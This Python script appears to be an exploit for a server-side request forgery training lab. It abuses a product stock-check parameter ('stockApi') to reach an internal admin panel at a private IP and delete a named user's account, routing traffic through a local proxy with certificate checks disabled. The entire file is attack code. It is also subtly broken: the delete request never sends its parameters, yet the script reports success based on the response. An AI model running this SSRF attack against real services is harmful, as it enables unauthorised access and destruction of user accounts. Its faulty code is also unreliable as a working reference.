import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}


def delete_user(url, username):
    admin_page_url = "http://192.168.0.225:8080/admin"
    check_stock_path = "/product/stock"
    params = {"stockApi": admin_page_url}
    response = requests.get(url + check_stock_path, data=params, verify=False, proxies=proxies)
    if response.status_code == 200:
        print(f"Found Admin Dashboard\n Now deleting {username}'s account.")
        # Delete user's account
        delete_user_path = f"http://192.168.0.225:8080/admin/delete?username={username}"
        params = {"stockApi": delete_user_path}
        response = requests.post(url + check_stock_path, verify=False, proxies=proxies)
        if f"{username}" not in response.text:
            print("User deleted successfully.")
        else:
            print("User deletion failed, try again later.")
    else:
        print(f"Could not find Admin Dashboard, try again later.")
        sys.exit(1)


def main():
    if len(sys.argv) != 3:
        print("Usage: python script.py [url] [username]")
        print("Example: python script.py http://localhost:8080 carlos")
        sys.exit(-1)

    url = sys.argv[1]
    username = sys.argv[2]
    print(f"Connecting to {url}")
    delete_user(url, username)


if __name__ == "__main__":
    main()
    sys.exit(0)
